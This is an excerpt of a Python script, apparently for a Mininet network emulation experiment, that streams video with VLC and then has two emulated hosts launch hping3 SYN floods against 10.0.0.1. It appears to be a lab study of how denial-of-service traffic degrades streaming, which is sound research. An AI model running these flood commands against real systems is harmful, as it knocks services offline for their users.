...
Ataque DoS streaming vlc Syn Flooding
...
def vlc_start_stream( self, host, filename, target, port ):
    ...
    #cmd += '--logfile=/data/Descargas/media_org/logsvlc/inputlog1.txt'
    cmd += " --sout '#duplicate{dst=display,dst=rtp{access=udp,mux=ts,dst=%s,port=%s}}'" % ( ip, port )
    #cmd += " --sout udp://10.0.0.3:1234 --ttl 12" 
    host.cmd(cmd + ' &') 
...
def dos_attackH4( self, host):
    cmd = ' hping3 -i u100000000000 -S -V -c 100000 -d 5000 -w 64 --flood 10.0.0.1 ' 
    host.cmd(cmd + ' &') 
    info( 'Host 4 : %s\n'%cmd)
    
def dos_attackH5(self, host):
    cmd = ' hping3 -i u100000000000 -S -V -c 100000 -d 5000 -w 64 --flood 10.0.0.1 ' 
    host.cmd(cmd + ' &') 
    info( 'Host 5 : %s\n'%cmd)
...
def vlc_start_vlc( self ):
    ...
    sleep(13)
    self.dos_attackH4( h4)
    self.dos_attackH5( h5)
    #self.vlc_start_stream( h2, movie_2, h4 , port_2 )
    #self.vlc_start_client( h4, port_2 )
...
CLI.dos_attackH4= dos_attackH4
CLI.dos_attackH5= dos_attackH5
